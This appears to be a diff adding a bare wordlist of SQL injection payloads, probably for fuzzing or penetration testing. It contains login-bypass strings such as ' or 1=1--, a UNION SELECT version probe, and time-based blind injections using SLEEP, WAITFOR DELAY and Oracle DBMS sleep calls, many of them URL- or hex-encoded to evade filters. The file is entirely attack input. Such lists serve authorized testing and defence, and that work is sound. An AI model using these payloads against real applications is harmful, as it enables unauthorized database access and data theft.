@@ -1,0 +1,46 @@
+' OR ''='
+" or ""="
+"' OR 1'"
+' ' OR 1
+\' OR 1\'
+admin'--
+'admin'--'
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+1’ or ‘1’ = ‘1
+(1)or(1)=(1)
+' or 2=2--
+'/**/OR/**/""'='
+2 or 1 like 1--
+2 /**/or /**/2/**/=/**/2--
+2 or 1<2--
+' union select @@version,1,1,1--
+' OR SELECT SLEEP(15)--
+' OR SELECT SLEEP(15);
+' AND SELECT WAITFOR DELAY '00:00:10'
+' OR SELECT WAITFOR DELAY '00:00:10'
+%27OR%20SELECT%20SLEEP(10)%2d%2d
+%25%27OR%20SELECT%20SLEEP(10)%2d%2d
+%27OR%20SELECT%20SLEEP(7);%2d%2d
+%27AND%20SELECT%20WAITFOR%20DELAY%20'00:00:10'
+%27OR%20SELECT%20WAITFOR%20DELAY%20'00:00:10'
+'%20'%20OR%20SELECT%20SLEEP(10)%2d%2d
+'%20'%20OR%20SELECT%20SLEEP(10);
+'%20'%20OR%20UNION%20SELECT%20SLEEP(10);--
+%22%20%6f%72%20%22%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%53%4c%45%45%50%28%31%35%29%2f%2a
+%22%20%6f%72%20%22%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%53%4c%45%45%50%28%31%35%29%252f%252a
+%3bsleep%2810%29%3b
+sleep%2810%29%3b
+%3bsleep%2810%29%2d%2d
+EXEC DBMS_LOCK.sleep(20);
+EXEC DBMS_SESSION.sleep(20);
+EXEC%20DBMS%5fLOCK%2esleep%2820%29%3b
+EXEC%20DBMS%5fSESSION%2esleep%2820%29%3b
+'OR EXEC DBMS_SESSION.sleep(20)
+sys.dbms_session.sleep(10);
+%27%20%4f%52%20%73%79%73%2e%64%62%6d%73%5f%73%65%73%73%69%6f%6e%2e%73%6c%65%65%70%28%31%30%29%3b%2d%2d
